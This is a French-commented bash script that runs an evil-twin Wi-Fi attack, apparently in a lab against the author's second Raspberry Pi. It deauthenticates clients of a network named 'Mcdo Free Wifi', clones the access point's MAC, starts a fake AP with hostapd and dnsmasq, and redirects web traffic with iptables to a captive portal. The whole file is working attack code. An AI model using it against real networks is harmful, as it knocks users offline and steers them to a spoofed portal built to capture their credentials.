#!/bin/bash
# ===========================================
# EVIL TWIN — Pi A (kali-raspberrypi-A)
# Clone le réseau "Mcdo Free Wifi" de Pi B
# Lance : deauth → clone MAC → fake AP → portail captif
# ===========================================

IFACE_MON=wlan1        # Clé ALFA — mode moniteur + AP
ETH_IP="192.168.1.21"  # IP SSH de secours sur eth0
AP_IP="192.168.50.1"
SSID="Mcdo Free Wifi"
CHANNEL=6
PORTAL_DIR="$HOME/captive_portal"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║         EVIL TWIN — Pi A                 ║${NC}"
echo -e "${CYAN}║  Cible : $SSID              ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
echo ""

# ÉTAPE 1 : Sécuriser SSH sur eth0
echo -e "${YELLOW}[1] Sécurisation SSH via eth0...${NC}"
sudo ip addr add $ETH_IP/24 dev eth0 2>/dev/null
echo -e "${GREEN}[+] SSH disponible sur $ETH_IP${NC}"

# ÉTAPE 2 : Tuer les processus concurrents
echo -e "${YELLOW}[2] Nettoyage des processus...${NC}"
sudo pkill wpa_supplicant 2>/dev/null
sudo pkill hostapd 2>/dev/null
sudo pkill dnsmasq 2>/dev/null
sudo pkill python3 2>/dev/null
sleep 1

# ÉTAPE 3 : Mode moniteur + scan MAC
echo -e "${YELLOW}[3] Scan passif — recherche $SSID...${NC}"
sudo airmon-ng start $IFACE_MON 2>/dev/null
sleep 1
rm -f /tmp/scan-*.csv
sudo timeout 15 airodump-ng --essid "$SSID" \
    -w /tmp/scan --output-format csv $IFACE_MON 2>/dev/null
sleep 2

CSV_FILE=$(ls -t /tmp/scan-*.csv 2>/dev/null | head -1)
if [ -z "$CSV_FILE" ]; then
    echo -e "${RED}[-] Aucun CSV — Pi B actif ?${NC}"
    exit 1
fi

MAC_CIBLE=$(grep -a "$SSID" "$CSV_FILE" | head -1 | cut -d',' -f1 | tr -d ' ')
MAC_CLIENT=$(grep -a "$SSID" "$CSV_FILE" | tail -1 | awk -F',' '{print $1}' | tr -d ' ')

if [ -z "$MAC_CIBLE" ]; then
    echo -e "${RED}[-] MAC non trouvée. Lance Pi B d'abord.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] AP cible   : $MAC_CIBLE${NC}"
echo -e "${GREEN}[+] Client     : $MAC_CLIENT${NC}"

# ÉTAPE 4 : Deauth 15s
echo -e "${YELLOW}[4] Deauth 15s sur $MAC_CIBLE...${NC}"
sudo iwconfig $IFACE_MON channel $CHANNEL
sudo aireplay-ng --deauth 0 -a $MAC_CIBLE -c $MAC_CLIENT $IFACE_MON &
DEAUTH_PID=$!
sleep 15
kill $DEAUTH_PID 2>/dev/null

# ÉTAPE 5 : Mode managed + clonage MAC
echo -e "${YELLOW}[5] Passage en mode managed + clonage MAC...${NC}"
sudo airmon-ng stop $IFACE_MON 2>/dev/null
sudo ip link set $IFACE_MON down
sudo ip link set $IFACE_MON address $MAC_CIBLE
sudo ip link set $IFACE_MON up
sleep 1

# ÉTAPE 6 : Éviter conflit IP sur wlan0
echo -e "${YELLOW}[6] Flush IP wlan0...${NC}"
sudo ip addr flush dev wlan0 2>/dev/null

# ÉTAPE 7 : IP sur wlan1
echo -e "${YELLOW}[7] Configuration IP Evil Twin...${NC}"
sudo ifconfig $IFACE_MON $AP_IP netmask 255.255.255.0

# ÉTAPE 8 : iptables
echo -e "${YELLOW}[8] Règles iptables (redirection captive portal)...${NC}"
sudo iptables -t nat -F
sudo iptables -F FORWARD
sudo iptables -t nat -A PREROUTING -i $IFACE_MON -p tcp --dport 80 \
    -j DNAT --to-destination $AP_IP:80
sudo iptables -t nat -A PREROUTING -i $IFACE_MON -p tcp --dport 443 \
    -j DNAT --to-destination $AP_IP:80
sudo iptables -t nat -A PREROUTING -i $IFACE_MON -p tcp --dport 80 \
    ! -d $AP_IP -j DNAT --to-destination $AP_IP:80
sudo iptables -A FORWARD -i $IFACE_MON -j ACCEPT
sudo iptables -A FORWARD -o $IFACE_MON -j ACCEPT
sudo iptables -I INPUT -i $IFACE_MON -p tcp --dport 80 -j ACCEPT
sudo iptables -I INPUT -i $IFACE_MON -p tcp --dport 443 -j ACCEPT
sudo iptables -I INPUT -i $IFACE_MON -p udp --dport 53 -j ACCEPT

# ÉTAPE 9 : dnsmasq
echo -e "${YELLOW}[9] Démarrage dnsmasq...${NC}"
sudo dnsmasq -C /etc/dnsmasq.conf

# ÉTAPE 10 : hostapd
echo -e "${YELLOW}[10] Démarrage hostapd Evil Twin...${NC}"
sudo hostapd /etc/hostapd/hostapd.conf &
sleep 2

# ÉTAPE 11 : Portail captif
echo -e "${YELLOW}[11] Démarrage portail captif...${NC}"
cd $PORTAL_DIR && sudo python3 server.py &
sleep 1

echo ""
echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  EVIL TWIN ACTIF                         ║${NC}"
echo -e "${GREEN}║  SSID     : $SSID           ║${NC}"
echo -e "${GREEN}║  BSSID    : $MAC_CIBLE                   ║${NC}"
echo -e "${GREEN}║  Portal   : http://$AP_IP          ║${NC}"
echo -e "${GREEN}║  Dashboard: http://192.168.1.15/dashboard║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
